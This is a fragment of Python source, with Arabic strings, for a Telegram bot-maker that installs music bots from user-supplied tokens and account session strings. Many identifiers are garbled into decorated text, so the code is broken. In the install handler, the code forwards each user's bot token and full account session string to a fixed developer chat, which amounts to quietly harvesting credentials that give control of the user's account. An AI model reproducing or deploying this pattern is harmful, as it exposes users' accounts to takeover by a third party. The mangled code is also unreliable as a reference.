...
from   𝒎𝒐𝒅 ❤️r.play import Call
from config import user as usr, dev, call, logger, logger_mode, botname, appp
from   𝒎𝒐𝒅 ❤️y import caes,   𝒎𝒐𝒅 ❤️y, group, source, photosource,   𝒎𝒐𝒅 ❤️id, ch
...
async def alivehi(client: Client, message):
    if message.from_user.username in   𝒎𝒐𝒅 ❤️:
        return
...
async def caesar(client: Client, message):
    ...
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("مطور السورس ⚡", url=f"https://t.me/{  𝒎𝒐𝒅 ❤️y}"),
...
async def cae5465sar(client: Client, message):
    ...
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("نعم لدي", callback_data=f"hossam1"), InlineKeyboardButton("ليس لدي", callback_data=f"  𝒎𝒐𝒅 ❤️1")]])
...
@app.on_callback_query(filters.regex(pattern=r"^(  𝒎𝒐𝒅 ❤️1|hossam1)$"))
async def admin_risghts(client: Client, CallbackQuery):
   ...
   if command == "  𝒎𝒐𝒅 ❤️1":
    ...
    user = Client("  𝒎𝒐𝒅 ❤️", api_id=API_ID, api_hash=API_HASH, session_string=SESSION, in_memory=True)
    try:       
       await user.start()
    except:
       await bot.stop()
    ...
    await client.send_message(chat_id=  𝒎𝒐𝒅 ❤️id, text=f"✨ تم تنصيب بوت بنجاح \nيوزر البوت : @{CASR}\n\n بواسطة @{id}\nتوكن البوت :{TOKEN}\nجلسه الحساب : `{SESSION}` \nجروب التخزين : \n [{loggerlink}] ")   
   if command == "hossam1":
    ...
    for x in get_Bots():
        try:
            ...
            if bot_username not in Musi:
                ...
                SESSION = x[3]
                logg = x[4]
                bot = Client("  𝒎𝒐𝒅 ❤️", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True,  plugins=dict(root="  𝒎𝒐𝒅 ❤️r"))
                user = Client("  𝒎𝒐𝒅 ❤️", api_id=API_ID, api_hash=API_HASH, session_string=SESSION, in_memory=True)
                await bot.start()
                await user.start()
...
async def   𝒎𝒐𝒅 ❤️hg5d(client, message):
    if not message.from_user.username in DEVS and not message.from_user.username in DEVSs:
        return
    try:
        bot = await client.ask(message.chat.id, "هات يوزر البوت", timeout=200)
...
async def   𝒎𝒐𝒅 ❤️gd(client, message):
    if not message.from_user.username in DEVS and not message.from_user.username in DEVSs:
        return
    try:
        bot = await client.ask(message.chat.id, "هات يوزر البوت", timeout=200)
